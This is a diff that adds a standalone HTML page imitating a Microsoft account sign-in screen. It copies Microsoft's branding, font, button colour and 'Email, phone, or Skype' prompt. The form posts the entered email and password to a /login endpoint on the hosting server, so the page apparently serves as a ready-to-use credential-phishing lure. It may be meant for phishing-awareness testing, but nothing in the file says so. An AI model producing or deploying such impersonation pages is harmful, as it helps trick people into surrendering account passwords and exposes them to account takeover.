@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sign in to your account</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f2f2f2; margin: 0; color: #1b1b1b }
+        .card { max-width: 440px; margin: 8vh auto; background: #fff; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,.2) }
+        h1 { font-size: 24px; font-weight: 600; margin: 6px 0 18px }
+        input { width: 100%; box-sizing: border-box; padding: 10px 6px; margin: 6px 0; border: 0; border-bottom: 1px solid #666; font-size: 15px }
+        button { float: right; margin-top: 16px; padding: 8px 30px; border: 0; background: #0067b8; color: #fff; font-size: 15px }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <b>Microsoft</b>
+        <h1>Sign in</h1>
+        <form method="POST" action="/login">
+            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign in</button>
+        </form>
+    </div>
+</body>
+</html>
